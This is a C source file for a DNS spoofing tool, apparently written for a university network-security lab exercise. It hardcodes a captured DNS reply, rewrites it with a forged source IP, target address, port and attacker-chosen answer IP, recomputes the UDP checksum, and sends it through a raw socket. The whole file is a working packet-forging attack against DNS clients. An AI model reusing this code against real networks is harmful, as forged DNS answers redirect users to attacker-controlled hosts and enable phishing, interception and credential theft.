#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>


// Linux cooked capture
//	00 00 02 00 00 00 00 00 00 00 00 00 00 00 08 00

// IP
//	45 00 00 a3 f0 22 40 00 fc 11 a9 ce 
// source 128.130.2.3
//										80 82 02 03 
// destination 128.131.225.79
//	80 83 e1 4f 

// UDP: 
// OCTET 1,2	Source Port: 53
//				00 35 
// OCTET 3,4	Destination Port: 32773
//					  80 05 
// OCTET 5,6	Length: 143 -> UDP header length + Data/DNS length
//							00 8f 
// OCTET 7,8 	Checksum
//								  2c 7e 
// OCTET 9,10…..	Data isn DNS

// DNS: 
//										44 6f 85 80
//	00 01 00 01 00 02 00 02 07 69 6e 65 74 73 65 63
//	04 61 75 74 6f 06 74 75 77 69 65 6e 02 61 63 02
//	61 74 00 00 01 00 01 c0 0c 00 01 00 01 00 01 51
//	80 00 04 
//	ADDR of inetsec.auto...: 128.130.60.30
//			 80 82 3c 1e 
//						 c0 14 00 02 00 01 00 01 51
//	80 00 0a 07 74 75 6e 61 6d 65 62 c0 19 c0 14 00
//	02 00 01 00 01 51 80 00 0a 07 74 75 6e 61 6d 65
//	61 c0 19 c0 5d 00 01 00 01 00 01 51 80 00 04 80
//	82 02 03 c0 47 00 01 00 01 00 01 51 80 00 04 80
//	82 03 83
#define DEBUG 1

#define OFFSET_SRC_IP 	12 // 0x80, 0x82, 0x02, 0x03
#define OFFSET_DST_IP 	16 // 0x80, 0x83, 0xe1, 0x4
#define OFFSET_UDP_HEAD	20 // 0x00, 0x35
#define OFFSET_DST_PORT 22 // 0x80, 0x05
#define OFFSET_CHECK	26 // 0x80, 0x05
#define OFFSET_UDP_BUF 	28 // 0x44, 0x6f
#define OFFSET_ANW_IP 	83 // 0x80, 0x82, 0x3c, 0x1e
#define UDP_BUFF_LEN	135
#define UDP_LEN			143
#define PACKET_LEN		163

//NOTE: checksum set to 0x00 0x00 from 0x2c 0x7e

unsigned short packet[] = {
	/* ---IP--- */
   0x45, 0x00, 0x00, 0xa3, 0xf0, 0x22, 0x40, 0x00, 		0xfc, 0x11, 
	/* Checksum 0xa9, 0xce */										0x00, 0x00, 
	/* Src ip */																0x80, 0x82, 0x02, 0x03,
   0x80, 0x83, 0xe1, 0x4f, 
   
	/* ---UDP--- */
	/* Src port */		   0x00, 0x35, 
	/* Dst port*/					   0x80, 0x05, 		
	/* Length */										0x00, 0x8f, 
	/* Checksum */													0x00, 0x00, 
						   
	/* UDP-Buff: ---DNS--- */
																				0x44, 0x6f, 0x85, 0x80,
   0x00, 0x01, 0x00, 0x01, 0x00, 0x02, 0x00, 0x02, 		0x07, 0x69, 0x6e, 0x65, 0x74, 0x73, 0x65, 0x63,
   0x04, 0x61, 0x75, 0x74, 0x6f, 0x06, 0x74, 0x75, 		0x77, 0x69, 0x65, 0x6e, 0x02, 0x61, 0x63, 0x02,
   0x61, 0x74, 0x00, 0x00, 0x01, 0x00, 0x01, 0xc0, 		0x0c, 0x00, 0x01, 0x00, 0x01, 0x00, 0x01, 0x51,
   0x80, 0x00, 0x04, 
					 0x80, 0x82, 0x3c, 0x1e, 
											 0xc0, 		0x14, 0x00, 0x02, 0x00, 0x01, 0x00, 0x01, 0x51,
   0x80, 0x00, 0x0a, 0x07, 0x74, 0x75, 0x6e, 0x61, 		0x6d, 0x65, 0x62, 0xc0, 0x19, 0xc0, 0x14, 0x00,
   0x02, 0x00, 0x01, 0x00, 0x01, 0x51, 0x80, 0x00, 		0x0a, 0x07, 0x74, 0x75, 0x6e, 0x61, 0x6d, 0x65,
   0x61, 0xc0, 0x19, 0xc0, 0x5d, 0x00, 0x01, 0x00, 		0x01, 0x00, 0x01, 0x51, 0x80, 0x00, 0x04, 0x80,
   0x82, 0x02, 0x03, 0xc0, 0x47, 0x00, 0x01, 0x00, 		0x01, 0x00, 0x01, 0x51, 0x80, 0x00, 0x04, 0x80,
   0x82, 0x03, 0x83
};

typedef unsigned short 	u8;
typedef unsigned short 	u16;
typedef unsigned long 	u32;



/**
 * 
 * To calculate UDP checksum a "pseudo header" is added to the UDP header. This includes:
 * IP Source Address	4 bytes
 * IP Destination Address	4 bytes
 * Protocol		2 bytes
 * UDP Length  		2 bytes
 * 
 * The checksum is calculated over all the octets of the pseudo header, UDP header and data. 
 * If the data contains an odd number of octets a pad, zero octet is added to the end of data. 
 * The pseudo header and the pad are not transmitted with the packet. 
 * 
 * u16 len_udp 		is the length (number of octets) of the UDP header and data.
 * u16 src_addr[4] 	is the IP source address octet
 * u16 dest_addr[4] is the IP destination address octet
 * BOOL padding 	is 1 if data has an even number of octets and 0 for an odd number. 
 * u16 buff[] 		is an array containing all the octets in the UDP header and data.
 * 
 */
u16 udp_sum_calc(u16 len_udp, u16 src_addr[], u16 dest_addr[], u8 padding, u16 buff[]){
	u16 prot_udp	= 17;
	u16 padd		= 0;
	u16 word16;
	u32 sum;	
	
	// Find out if the length of data is even or odd number. If odd,
	// add a padding byte = 0 at the end of packet
	if (padding&1==1){
		if(DEBUG)printf("Adding padding byte\n");
		padd=1;
		buff[len_udp]=0;
	}
	
	//initialize sum to zero
	sum=0;
	
	//reserve i
	int i;
	
	// make 16 bit words out of every two adjacent 8 bit words and 
	// calculate the sum of all 16 vit words
	for (i=0;i<len_udp+padd;i=i+2){
		word16 =((buff[i]<<8)&0xFF00)+(buff[i+1]&0xFF);
		sum = sum + (unsigned long)word16;
	}	
	//printf("1. sum: %li\n", sum);
	
	
	// add the UDP pseudo header which contains the IP source and destinationn addresses
	for (i=0;i<4;i=i+2){
		word16 =((src_addr[i]<<8)&0xFF00)+(src_addr[i+1]&0xFF);
		sum=sum+word16;	
	}
	//printf("2. sum: %li\n", sum);
	for (i=0;i<4;i=i+2){
		word16 =((dest_addr[i]<<8)&0xFF00)+(dest_addr[i+1]&0xFF);
		sum=sum+word16; 	
	}
	//printf("3. sum: %li\n", sum);
	// the protocol number and the length of the UDP packet
	sum = sum + prot_udp + len_udp;

	// keep only the last 16 bits of the 32 bit calculated sum and add the carries
    while (sum>>16)
		sum = (sum & 0xFFFF)+(sum >> 16);
	//printf("5. sum: %li\n", sum);
	// Take the one's complement of sum
	sum = ~sum;
	//printf("6. sum: %li\n", sum);

	return ((u16) sum);
}

//iparray has length: 4
long parse_ip(const char * ipc){	
 	struct in_addr * tmp;
	int result = 1;
	//result = inet_aton(ipc, tmp);
	if(result==0){
		fprintf(stderr, "Ip addr is invalid.\n");
		exit(1);
	}
	
	long address = inet_addr(ipc);
	unsigned char b1, b2, b3, b4;
	b1 = (address>>24)&0xff;
	b2 = (address>>16)&0xff;
	b3 = (address>>8)&0xff;
	b4 = (address>>0)&0xff;
	//printf("Ip address is: 0x%lx\n", address);
	//printf("Ip address is: %x %x %x %x\n", b1, b2, b3, b4);
	if(address==0xffffffff){
		fprintf(stderr, "Ip addr is invalid.\n");
		exit(1);		
	}
	
	return address;
}

void print_offsets(){
	printf("Offest src ip: 		0x%x 0x%x 0x%x 0x%x\n", packet[OFFSET_SRC_IP], packet[OFFSET_SRC_IP+1], 
		   packet[OFFSET_SRC_IP+2], packet[OFFSET_SRC_IP+3]);
	printf("Offest dst ip: 		0x%x 0x%x 0x%x 0x%x\n", packet[OFFSET_DST_IP], packet[OFFSET_DST_IP+1], 
		   packet[OFFSET_DST_IP+2], packet[OFFSET_DST_IP+3]);
	printf("Offest udp head:	0x%x 0x%x\n", packet[OFFSET_UDP_HEAD], packet[OFFSET_UDP_HEAD+1]);
	printf("Offest dst port:	0x%x 0x%x\n", packet[OFFSET_DST_PORT], packet[OFFSET_DST_PORT+1]);
	printf("Offest checksum:	0x%x 0x%x\n", packet[OFFSET_CHECK], packet[OFFSET_CHECK+1]);
	
	printf("Offest udp buf: 	0x%x 0x%x\n", packet[OFFSET_UDP_BUF], packet[OFFSET_UDP_BUF+1]);
	printf("Offest anw ip: 		0x%x 0x%x 0x%x 0x%x\n", packet[OFFSET_ANW_IP], packet[OFFSET_ANW_IP+1], 
		   packet[OFFSET_ANW_IP+2], packet[OFFSET_ANW_IP+3]);
	printf("\n");
}

//dnsspoof <source address> <destination address> <destination port> <answer IP> 
int main(int argc, char **argv){
	if(DEBUG)printf("DNSspoof\n");
	if(argc!=5){
		fprintf(stderr, "Not the correct amount of arguments. Exiting...\n");
		exit(1);
	}
	
	char * str_src_ip = argv[1];
	char * str_dst_ip = argv[2];
	int dst_port = atoi(argv[3]);
	char * str_anw_ip = argv[4];
	
	if (!isdigit(argv[3][0])) {
		fprintf(stderr, "Port %s!=%i is not an integer\n", argv[3], dst_port);
		exit(1);
	}
	
	if(DEBUG)print_offsets();
	
	long tmp_address;
	tmp_address = parse_ip(str_src_ip);
// 	u16 src_addr[]	= {(tmp_address>>24)&0xff, (tmp_address>>16)&0xff, (tmp_address>>8)&0xff, (tmp_address>>0)&0xff};
	u16 src_addr[]	= {(tmp_address>>0)&0xff, (tmp_address>>8)&0xff, (tmp_address>>16)&0xff, (tmp_address>>24)&0xff};
	
	tmp_address = parse_ip(str_dst_ip);
// 	u16 dest_addr[]	= {(tmp_address>>24)&0xff, (tmp_address>>16)&0xff, (tmp_address>>8)&0xff, (tmp_address>>0)&0xff};
	u16 dest_addr[]	= {(tmp_address>>0)&0xff, (tmp_address>>8)&0xff, (tmp_address>>16)&0xff, (tmp_address>>24)&0xff};
	
	tmp_address = parse_ip(str_anw_ip);
//	u16 anw_addr[]	= {(tmp_address>>24)&0xff, (tmp_address>>16)&0xff, (tmp_address>>8)&0xff, (tmp_address>>0)&0xff};
	u16 anw_addr[]	= {(tmp_address>>0)&0xff, (tmp_address>>8)&0xff, (tmp_address>>16)&0xff, (tmp_address>>24)&0xff};
		
	//printf("Current packet look:\n%s\n", packet);
		
	
	if(DEBUG)printf("\nModifying packet\n\n");
	//set the source ip
	packet[OFFSET_SRC_IP+0] = src_addr[0];
	packet[OFFSET_SRC_IP+1] = src_addr[1];
	packet[OFFSET_SRC_IP+2] = src_addr[2];
	packet[OFFSET_SRC_IP+3] = src_addr[3];
	
	//set the destination ip
	packet[OFFSET_DST_IP+0] = dest_addr[0];
	packet[OFFSET_DST_IP+1] = dest_addr[1];
	packet[OFFSET_DST_IP+2] = dest_addr[2];
	packet[OFFSET_DST_IP+3] = dest_addr[3];
	
	//set the destination port
	packet[OFFSET_DST_PORT+0] = (dst_port>>8)&0xff;
	packet[OFFSET_DST_PORT+1] = (dst_port>>0)&0xff;
	
	//set the dns answer ip
	packet[OFFSET_ANW_IP+0] = anw_addr[0];
	packet[OFFSET_ANW_IP+1] = anw_addr[1];
	packet[OFFSET_ANW_IP+2] = anw_addr[2];
	packet[OFFSET_ANW_IP+3] = anw_addr[3];
	
	//BOOL padding is 1 if data has an even number of octets and 0 for an odd number. 
	u16 checksum = udp_sum_calc(UDP_LEN, src_addr, dest_addr, UDP_BUFF_LEN%2==1, (unsigned short *)(packet+OFFSET_UDP_HEAD));
	if(DEBUG)printf("Checksum is: %i=0x%x\n", checksum, checksum);
	//set the udp checksum
	packet[OFFSET_CHECK+0] = (checksum>>8)&0xff;
	packet[OFFSET_CHECK+1] = (checksum>>0)&0xff;
	
	if(DEBUG)print_offsets();
	
	if(DEBUG)printf("Sending over network\n");
		
	char * char_sock = getenv("SOCK_FD");
	int sd = atoi(char_sock);
	if (!isdigit(char_sock[0])) {
		fprintf(stderr, "Socket descriptor %s!=%i is not an integer\n", char_sock, sd);
		exit(1);
	}
		
	int one = 1;
	const int *val = &one;
	if ((setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one))) < 0)
	{
		perror("setsockopt() error");
		exit(1);
	}

	
	struct sockaddr_in requester;
	memset(&requester, sizeof(struct sockaddr_in), 0);
	requester.sin_family = AF_INET;
	requester.sin_addr.s_addr = inet_addr(str_dst_ip);
	requester.sin_port = htons(dst_port);
	//requester.sin_port = htons(10000);
	
	char c_packet[PACKET_LEN];
	int i;
	for(i = 0; i < PACKET_LEN; i++){
		c_packet[i] = packet[i];
	}
	
	
	if(sendto(sd, c_packet, PACKET_LEN, 0, (struct sockaddr *)&requester, sizeof(struct sockaddr_in)) != PACKET_LEN){
		perror("sendto() error");
		exit(1);
	}else {
		printf("sendto() successful\n");
	}
	
	close(sd);
	
	return 0;
}
